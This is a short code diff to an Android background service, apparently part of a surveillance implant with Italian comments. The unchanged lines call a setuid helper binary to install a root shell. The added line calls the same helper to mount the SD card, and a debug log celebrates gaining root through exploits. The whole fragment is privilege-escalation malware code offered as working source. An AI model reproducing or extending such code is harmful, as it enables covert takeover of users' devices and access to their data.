@@ -156,6 +156,9 @@ public class ServiceCore extends Service {
 				// Installiamo la shell root
 				Runtime.getRuntime().exec(path + "/" + suidext + " rt");
 				
+				// Montiamo la SD
+				Runtime.getRuntime().exec(path + "/" + suidext + " sd");
+				
 				if (Cfg.DEBUG) {
 					Log.d("QZ", TAG + " (onStart): WE ARE ROOOOOOOT, I LOVE QUEZ MADE EXPLOITS!!!");
 					Toast.makeText(this,
